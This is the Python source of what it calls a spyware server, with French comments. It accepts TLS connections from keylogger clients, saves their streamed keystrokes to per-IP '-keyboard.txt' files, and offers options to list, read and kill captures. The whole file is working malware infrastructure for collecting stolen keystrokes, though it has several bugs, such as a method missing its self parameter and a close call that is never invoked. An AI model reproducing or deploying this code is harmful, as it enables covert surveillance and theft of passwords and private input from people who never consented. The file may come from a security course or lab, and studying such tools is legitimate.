import ssl 
import socket 
import datetime
import argparse
import os 
import time 

class server:
    def argument(self):
        parser = argparse.ArgumentParser(description="Serveur Spyware")
        parser.add_argument("-l", "--listen", type=int, help="Saissisez un numéro port d'écoute pour le serveur spyware. exemple : 1234 ")
        parser.add_argument("-s", "--show", action="store_true", help="affiche la liste des fichiers réceptionnées par le serveur spyware")
        parser.add_argument("-r", "--readfile", type=str, help="affiche le contenu du fichier stocké sur le serveur du spyware")
        parser.add_argument("-k", "--kill", action="store_true", help="arrête toute les instances de serveurs en cours, avertit le spyware de s'arrêter et de supprimer la capture.")

        args = parser.parse_args()

        if args.listen:
            self.start_server(args.listen)
        elif args.show:
            self.show_files()
        elif args.readfile:
            self.read_file(args.readfile)
        elif args.kill:
            self.kill()
        else:
            parser.print_help()

    def show_files(self):
        try:
            directory = os.listdir("/home/spyware/spyware/file")
            print(f"Liste des fichiers réceptionnées par le serveur: {directory}")
        except FileNotFoundError:
            print(f"Erreur: Le dossier {directory} n'a pas été trouvé")
        except Exception as e:
            print(f"Erreur: {e}")

    def read_file(self, filename):
        try:
            with open(filename, "r") as file:
                content = file.read()
            print(f"Liste du fichier : {filename}: \n{content}")
        except FileNotFoundError:
            print(f"Erreur: Le fichier {filename} n'a pas été trouvé")
        except Exception as e:
            print(f"Erreur: {e}")

    def start_server(self, port):
        host = "172.20.10.4"
        socket_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        socket_server.bind((host, port))
        socket_server.listen(5)
        print(f"Serveur lancé {host} et écoute sur le port {port}")

        try:
            context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
            context.load_cert_chain("/home/spyware/spyware/certificats/cert/cert-server.pem", "/home/spyware/spyware/certificats/cert/cert-key.pem")

        except FileNotFoundError as file_error:
            print(f"Erreur: Certificat ou clé privée introuvable - {file_error}")
        except ssl.SSLError as ssl_error:
            print(f"Erreur SSL: {ssl_error}")
        except Exception as e:
            print(f"Erreur: {e}")

        server_ssl = context.wrap_socket(socket_server, server_side=True)


        while True:
            try:
                client_ssl, _ip = server_ssl.accept()
                print(f"Client IP: {_ip}")

                self.receive_and_save_data(client_ssl)
            
            except Exception as e:
                print(f"Erreur: {e}")
    
    def receive_and_save_data(client_ssl):
        client_ip = client_ssl.getpeername()[0]
        temps = 600 
        start_time = time.time()
        file_number = 1
        while True:
            file_name = f"{client_ip} -keyboard.txt"
            try:
                with open(file_name, "wb") as file:
                    current_time = time.time()
                    while current_time - start_time < temps:
                        data = client_ssl.recv(4096)
                        if not data:
                            break
                        file.write(data)
                        current_time = time.time()

                    print(f"Fichier reçu: {file_name}")
            except Exception as e:
                print(f"Erreur: {e}")
            finally:
                file_number += 1
                start_time = time.time()

        client_ssl.close
                    
if __name__ == "__main__":
    server = server()
    server.argument()